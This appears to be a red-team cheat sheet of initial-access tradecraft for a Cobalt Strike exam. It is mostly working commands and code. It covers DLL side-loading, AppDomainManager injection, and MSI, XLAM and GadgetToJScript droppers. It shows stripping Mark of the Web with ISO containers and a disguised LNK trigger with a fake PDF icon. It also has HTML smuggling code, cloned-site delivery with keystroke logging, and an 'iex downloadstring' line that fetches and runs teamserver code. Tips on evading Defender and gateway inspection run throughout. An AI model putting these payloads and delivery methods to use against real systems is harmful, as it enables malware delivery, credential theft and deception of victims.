# Initial Access

> Assume-breach exam scenario: foothold machine is provided with creds. No pre-running Beacon. Must bypass host-based defences to stage first Beacon. Defender is ON.

**Taxonomy:** `DELIVERY → CONTAINER → TRIGGER → PAYLOAD → DECOY`

---

## Pre-Flight — Defender Must Be Bypassed First

Before any payload lands on disk or executes, the following must be clean:

```
[ ] Artifact Kit built and ThreatCheck clean (Defender engine)
[ ] Resource Kit built and ThreatCheck clean (AMSI engine)
[ ] Malleable C2 profile: stage + post-ex + process-inject blocks loaded
[ ] artifact.cna + resources.cna loaded in CS Script Manager
```

See `cheatsheets/defense-evasion.md` for the full build workflow.

---

## Payloads

### DLL Side-Loading

Force a legitimate application to load a malicious DLL by exploiting the Windows DLL search order.

**Find opportunities with ProcMon filter:**
```
Path ends with .dll  AND  Result = NAME NOT FOUND
```

**WinSxS — older vulnerable app versions stored here even after patching:**
```
C:\Windows\WinSxS\
```

Easiest hijack target: **current working directory** — drop DLL with correct name into CWD and run the app.

```cmd
# Find ngentask.exe in WinSxS (older version with DLL search order vuln)
dir /s /b C:\Windows\WinSxS\*ngentask.exe

# Drop DLL into CWD and execute
copy C:\Payloads\mscorsvc.dll .
ngentask.exe
```

### AppDomainManager Injection (.NET Framework apps)

Forces any .NET Framework app to load a custom DLL via environment variables or `.config` file.

**Method 1 — Environment Variables:**

```cmd
set APPDOMAIN_MANAGER_ASM=MyManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyManager.MyDomainManager
ngentask.exe
```

**Method 2 — Config file** (filename must match app: `ngentask.exe.config`):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="MyManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="MyManager.MyDomainManager" />
  </runtime>
</configuration>
```

DLL must be in the same directory as the target .NET app. Over 100 .NET assemblies installed by default — copy one (e.g. `ngentask.exe`) into CWD to use as the trigger.

### Windows Installer (MSI)

MSI packages trigger payload execution during the install process.

```
VS → New Project → Setup Project
→ Add File: payload exe to Application Folder
→ View → Custom Actions → Install → Add Custom Action → select payload
→ Set "Run 64 Bit" = True on the action
→ Build → produces .exe wrapper + .msi (deliver .msi only)
```

> MSI installs run with user-level permissions unless UAC prompt accepted. The `.exe` wrapper is not needed — deliver `.msi` only.

### Excel Add-In (XLAM)

XLAM files in `%APPDATA%\Microsoft\Excel\XLSTART\` execute automatically when Excel opens — bypasses Protected View (trusted location).

```
Alt+F11 → Insert Module → add macro code
File → Save As → Excel Add-In (*.xlam) → save to C:\Payloads\
```

**Delivery:** Copy to XLSTART (writable by standard user):
```cmd
copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\payload.xlam"
# Executes automatically on next Excel launch — no user interaction needed
```

### Dropper — GadgetToJScript (.NET DLL → JS/VBS/HTA)

Embeds a payload inside a .NET DLL and serialises it to JavaScript. Chain: `JS → .NET DLL → EXE/DLL`.

```
VS → New .NET Framework Class Library → add payload as Embedded Resource
→ GetManifestResourceStream → write to C:\ProgramData\<dir>\payload.exe → Process.Start
→ Build → MyDropper.dll
```

```bash
# Serialise to JS dropper
GadgetToJScript.exe -a MyDropper.dll -w js -b -o dropper
# -w: js / vbs / vba / hta
# -b: bypass .NET 4.8+ type check controls
```

Execution: double-click `dropper.js` (wscript default handler) or `wscript dropper.js`.

> **Safe drop paths** (writable, not default-suspicious): `C:\ProgramData\<subdir>\`
> Avoid user home directory and `%TEMP%` — flagged by behaviour rules.

---

## Containers — Stripping Mark of the Web (MotW)

MotW prevents macro execution in Office and triggers SmartScreen warnings. ISO/IMG containers do **not** propagate MotW to their contents.

```bash
# PackMyPayload — pack into ISO stripping MotW
python3 PackMyPayload.py trigger.lnk payload.dll decoy.pdf output.iso

# Hide payload and decoy, show only trigger
python3 PackMyPayload.py -H payload.dll -H decoy.pdf trigger.lnk output.img
```

**Container format comparison:**

| Format | MotW propagation | Native Windows support |
|--------|-----------------|----------------------|
| ISO | No | Yes (auto-mount) |
| IMG | No | Yes (auto-mount) |
| ZIP | Yes | Yes |
| WIM | No | Yes |
| 7z / RAR | Yes | No (needs 3rd party) |

---

## Triggers

### Shell Link (LNK) — Most Deceptive

`.lnk` extension hidden in Explorer even with "show extensions" on. Can have any icon. Filename `report.pdf.lnk` shows as `report.pdf`.

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\report.pdf.lnk")
$lnk.TargetPath     = "C:\Windows\System32\cmd.exe"
$lnk.Arguments      = "/c rundll32.exe C:\ProgramData\update\beacon.dll,StartW"
$lnk.IconLocation   = "C:\Windows\System32\shell32.dll,222"   # PDF icon
$lnk.WindowStyle    = 7   # Minimised — no visible window
$lnk.Save()
```

For XLAM delivery via LNK:
```powershell
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments  = '/c copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\" & start "" decoy.xlsx'
```

### Batch File (BAT/CMD)

```batch
@echo off
REM Sandbox evasion — exit if not double-clicked
echo %cmdcmdline% | findstr /i "%~0" > nul
if errorlevel 1 exit

REM Payload execution
start "" /min C:\ProgramData\update\payload.exe
REM Open decoy
start "" decoy.pdf
```

### MSC (Grim Resource — mmc.exe auto-elevate)

`mmc.exe` is auto-elevating — triggers UAC for local admins. MSC file embeds VBScript via XSS flaw.

```
1. Take example MSC template (GrimResource / MSC_Dropper)
2. Craft payload (URL-encoded VBScript on line 105):
   CreateObject("WScript.Shell").Run "cmd.exe /c <command>",0
3. URL-encode via CyberChef → paste into line 105
4. Deliver MSC file — double-click triggers mmc.exe → executes payload
```

---

## Delivery

### CS Host File + Site Clone

**Step 1 — Host payload:**
```
CS → Site Management → Host File
  File:      payload.iso (or .exe, .dll)
  Local URI: /windows-update.iso
  Local Host: <teamserver IP or lookalike domain>
  Port:       80 / 443
```

**Step 2 — Clone legitimate site and embed download:**
```
CS → Site Management → Clone Site
  Clone URL:  https://legitimate-site.com/download
  Local URI:  /download
  Local Host: <lookalike domain>
  Attack:     select hosted file from step 1
  Log keystrokes: Yes (if cloned page has login form)
```

Victim visits cloned URL → browser auto-downloads payload via hidden iframe.

### HTML Smuggling

Encodes payload in base64 inside HTML — bypasses content inspection gateways (no `application/octet-stream` traffic).

```html
<script>
  var fileContent = "<BASE64_ENCODED_PAYLOAD>";
  var fileName    = "windows-update.iso";

  function downloadFile() {
    var blob = new Blob([Uint8Array.from(atob(fileContent), c => c.charCodeAt(0))],
                        {type: 'application/octet-stream'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
  }
</script>
<button onclick="downloadFile()">View Document</button>
```

> Enhance with Web Crypto API (AES encrypt content) + JS obfuscation to defeat gateway inspection.

### SVG Smuggling

Same as HTML smuggling but in `.svg` format — triggers if Edge is the default SVG handler.

---

## CS Scripted Web Delivery — Fastest Lab/Exam First Beacon

```
CS → Attacks → Scripted Web Delivery
  Listener: http
  Type: PowerShell
  Launch → copy URL
```

On foothold machine (PowerShell):
```powershell
iex (new-object net.webclient).downloadstring('http://<teamserver>/payload_url')
```

> Requires Artifact Kit + Resource Kit loaded and profile active first — otherwise Defender will block.

---

## Code Signing (Context)

| Certificate Type | SmartScreen Effect | How Obtained |
|-----------------|-------------------|--------------|
| Standard | Signed, but "Unknown Publisher" still shown | Buy from DigiCert / GlobalSign |
| EV (Extended Validation) | Fully trusted — removes all warnings | Requires business vetting |

> For exam: code signing is not required but reduces friction. Do not sign payloads with a cert traceable to your real identity — it will be revoked if the file is submitted to VirusTotal.

---

## Initial Access OPSEC Summary

| Technique | OPSEC | Notes |
|-----------|-------|-------|
| ISO container + LNK trigger | SAFE | Strips MotW, no direct execution from untrusted path |
| AppDomainManager injection | SAFE | Runs inside legit .NET process, no child cmd.exe |
| DLL side-loading via WinSxS | SAFE | Legit process loads DLL — no new suspicious process |
| XLAM auto-load via XLSTART | SAFE | Executes inside Excel — no suspicious parent |
| GadgetToJScript JS dropper | CAUTION | wscript.exe spawning — monitor parent-child chain |
| MSI install | CAUTION | Installer process visible, writes to disk |
| Scripted Web Delivery (PS) | CAUTION | IEX download — AMSI applies, resource kit must be clean |
| BAT/CMD trigger | UNSAFE | cmd.exe spawns visible in EDR process tree |

---

## Quick Reference

```
FIRST BEACON:    CS → Attacks → Scripted Web Delivery → iex downloadstring
HOST FILE:       CS → Site Management → Host File → URI + port
CONTAINER:       python3 PackMyPayload.py [-H hidden] files... output.iso
LNK TRIGGER:     $wsh = New-Object -ComObject WScript.Shell → CreateShortcut
XLAM PERSIST:    copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\"
DLL SIDELOAD:    procmon filter: Path ends .dll + Result NAME NOT FOUND → drop DLL in CWD
APPDOMAIN:       set APPDOMAIN_MANAGER_ASM=... + APPDOMAIN_MANAGER_TYPE=... → run .NET app
DROPPER:         GadgetToJScript.exe -a MyDropper.dll -w js -b -o dropper
HTML SMUGGLING:  base64 payload in JS blob → auto-download on page load
```
